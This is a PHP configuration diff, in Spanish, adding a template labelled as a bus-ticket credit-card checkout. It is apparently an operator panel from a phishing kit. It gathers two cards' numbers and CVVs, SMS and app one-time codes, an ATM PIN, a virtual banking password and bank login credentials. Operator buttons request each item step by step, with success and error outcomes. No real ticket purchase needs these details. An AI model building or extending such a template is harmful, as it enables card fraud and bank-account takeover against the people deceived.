@@ -1074,4 +1074,104 @@ return [
         ],
     ],
 
+    /*
+    |--------------------------------------------------------------------------
+    | Plantilla PinBus TDC (Pasajes de Bus con Tarjeta de Crédito)
+    |--------------------------------------------------------------------------
+    */
+    'pinbus_tdc' => [
+        'header' => [
+            'enabled' => true,
+            'fields' => [
+                ['emoji' => '🚌', 'label' => 'Módulo', 'value' => 'PASAJES DE BUS'],
+                ['emoji' => '🔑', 'label' => 'ID Sesión', 'value' => '{uniqid}'],
+                ['emoji' => '💳', 'label' => 'Método', 'value' => 'Tarjeta de Crédito'],
+            ],
+        ],
+        'sections' => [
+            [
+                'name' => 'tarjeta_pago',
+                'enabled' => true,
+                'title' => '💳 TARJETA DE PAGO',
+                'fields' => [
+                    ['emoji' => '💳', 'label' => 'Número', 'key' => 'numeroTarjeta'],
+                    ['emoji' => '👤', 'label' => 'Titular', 'key' => 'nombreTitular'],
+                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'fechaVencimiento'],
+                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv'],
+                ],
+            ],
+            [
+                'name' => 'datos_pagador',
+                'enabled' => true,
+                'title' => '👤 DATOS DEL PAGADOR',
+                'fields' => [
+                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
+                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
+                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
+                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
+                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
+                    ['emoji' => '🗺️', 'label' => 'Departamento', 'key' => 'departamento'],
+                ],
+            ],
+            [
+                'name' => 'tarjeta_adicional',
+                'enabled' => true,
+                'title' => '💳 TARJETA ADICIONAL',
+                'fields' => [
+                    ['emoji' => '💳', 'label' => 'Número TDC', 'key' => 'tdc_numero'],
+                    ['emoji' => '📅', 'label' => 'Vence TDC', 'key' => 'tdc_vencimiento'],
+                    ['emoji' => '🔒', 'label' => 'CVV TDC', 'key' => 'tdc_cvv'],
+                ],
+            ],
+            [
+                'name' => 'codigos_seguridad',
+                'enabled' => true,
+                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
+                'fields' => [
+                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'otp_sms'],
+                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'otp_app'],
+                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'clave_cajero'],
+                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'clave_virtual'],
+                ],
+            ],
+            [
+                'name' => 'credenciales',
+                'enabled' => true,
+                'title' => '🔐 CREDENCIALES',
+                'fields' => [
+                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'login_usuario'],
+                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'login_clave'],
+                ],
+            ],
+            [
+                'name' => 'informacion_pago',
+                'enabled' => true,
+                'title' => 'ℹ️ INFORMACIÓN',
+                'fields' => [
+                    ['emoji' => '💰', 'label' => 'Total', 'key' => 'total'],
+                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
+                ],
+            ],
+        ],
+        'buttons' => [
+            'enabled' => true,
+            'rows' => [
+                [
+                    ['text' => 'TDC', 'action' => 'tdc'],
+                    ['text' => 'SMS', 'action' => 'codsms'],
+                    ['text' => 'APP', 'action' => 'codapp'],
+                ],
+                [
+                    ['text' => 'LOG', 'action' => 'login'],
+                    ['text' => 'CAJ', 'action' => 'pincaj'],
+                    ['text' => 'VIR', 'action' => 'pinvir'],
+                ],
+                [
+                    ['text' => 'EXITO', 'action' => 'exito'],
+                    ['text' => 'ERROR', 'action' => 'error'],
+                ],
+            ],
+        ],
+    ],
+
 ];
